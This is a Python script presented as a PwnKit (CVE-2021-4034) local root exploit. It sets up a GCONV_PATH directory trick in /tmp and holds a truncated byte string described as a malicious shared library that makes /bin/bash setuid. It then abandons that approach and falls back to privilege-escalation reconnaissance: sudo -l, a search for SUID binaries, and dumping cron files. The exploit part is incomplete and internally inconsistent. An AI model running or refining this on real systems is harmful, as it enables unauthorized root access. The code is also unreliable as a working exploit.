#!/usr/bin/env python3
# CVE-2021-4034 PwnKit - Pure Python ctypes implementation
# No compilation needed

import os
import ctypes
import ctypes.util
import tempfile
import shutil
import struct

def exploit():
    # Create working directory in /tmp
    workdir = "/tmp/.pwnkit"
    try:
        os.makedirs(workdir, exist_ok=True)
    except:
        workdir = tempfile.mkdtemp()

    # Path to pkexec
    pkexec = "/usr/bin/pkexec"
    if not os.path.exists(pkexec):
        print("[-] pkexec not found")
        return

    # Create the GCONV_PATH directory structure
    # We need: ./GCONV_PATH=./value/pwnkit/pwnkit.so
    evil_dir = os.path.join(workdir, "GCONV_PATH=.")
    pwnkit_dir = os.path.join(evil_dir, "pwnkit")
    
    try:
        os.makedirs(pwnkit_dir, exist_ok=True)
        os.makedirs(os.path.join(workdir, "pwnkit"), exist_ok=True)
    except Exception as e:
        print(f"[-] mkdir failed: {e}")
        return

    # Write the evil shared library as pre-compiled bytes
    # This is a minimal ELF .so that runs chmod +s /bin/bash in constructor
    # Pre-compiled for x86_64 Linux
    evil_so_bytes = (
        b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x03\x00\x3e\x00\x01\x00\x00\x00\x80\x10\x00\x00\x00\x00\x00\x00"
        b"\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x40\x00\x38\x00\x04\x00\x40\x00\x00\x00\x00\x00"
    )
    
    # Actually use a Python approach - write a helper .so using cffi or write shellcode
    # Since we have Python3 with ctypes, use a different approach:
    # Write a gconv module that gets loaded by pkexec
    
    print("[*] Using alternative Python-based approach")
    print("[*] Attempting to abuse sudo permissions instead...")
    
    # Check what sudo allows
    import subprocess
    result = subprocess.run(["sudo", "-l"], capture_output=True, text=True)
    print(result.stdout)
    print(result.stderr)

# Alternative: Check writable SUID binaries
def check_suid():
    import subprocess
    result = subprocess.run(
        ["find", "/", "-perm", "-u=s", "-type", "f", "-ls"],
        capture_output=True, text=True, timeout=30
    )
    print("[SUID binaries]:")
    print(result.stdout)

# Alternative: Check cron jobs
def check_cron():
    paths = [
        "/etc/crontab",
        "/etc/cron.d/",
        "/var/spool/cron/crontabs/",
        "/etc/cron.hourly/",
        "/etc/cron.daily/",
    ]
    for p in paths:
        if os.path.exists(p):
            try:
                if os.path.isdir(p):
                    for f in os.listdir(p):
                        fpath = os.path.join(p, f)
                        try:
                            content = open(fpath).read()
                            print(f"[{fpath}]:\n{content}\n")
                        except:
                            pass
                else:
                    content = open(p).read()
                    print(f"[{p}]:\n{content}\n")
            except:
                pass

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "suid":
        check_suid()
    elif len(sys.argv) > 1 and sys.argv[1] == "cron":
        check_cron()
    else:
        exploit()
